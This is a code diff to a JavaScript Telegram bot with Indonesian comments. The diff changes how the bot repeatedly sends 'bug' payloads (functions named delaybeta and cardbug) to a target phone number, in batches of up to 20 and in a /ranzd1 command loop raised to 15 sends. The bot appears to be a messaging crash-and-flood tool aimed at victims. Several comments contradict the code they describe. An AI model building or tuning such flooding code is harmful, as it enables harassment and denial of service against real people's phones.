@@ -2253,8 +2253,7 @@ return;
 
 if (count < 20) {
 await delaybeta(target, false);
-await cardbug(target, false);
-await sleep(4000) // Menggunakan target dari input pengguna
+await cardbug(target, false); // Menggunakan target dari input pengguna
 count++;
 console.log(chalk.red(`Mengirimkan Paket ${count}/20 ke ${target}`));
    sendNext(); // Melanjutkan pengiriman
@@ -2263,7 +2262,7 @@ console.log(chalk.red(`Mengirimkan Paket ${count}/20 ke ${target}`));
 console.log(chalk.green(`Selesai Mengirimkan 20 Paket Ke ${target}`)); // Log selesai kirim 800 paket
 count = 0; // Reset untuk paket berikutnya
 console.log(chalk.red("Menyiapkan Untuk Mengirim 20 Paket Berikutnya..."));
-setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
+setTimeout(sendNext, 300000); // Jeda 5 detik setelah selesai batch 800 pesan
 }
 };
 
@@ -4992,8 +4991,12 @@ bot.onText(/\/ranzd1(?:\s(.+))?/, async (msg, match) => {
 
     // Kirim notifikasi awal dengan gambar
     // Proses pengiriman bug
-    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
-        await sendMessagesForDurationX(24, formatedNumber)
+    for (let i = 0; i < 15; i++) { // Kirim 3 kali langsung
+        await delaybeta(formatedNumber);
+        await sleep(3000)
+        await cardbug(formatedNumber);
+        await sleep(3000)
+        console.log(chalk.red("Send Bug Succes"))
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
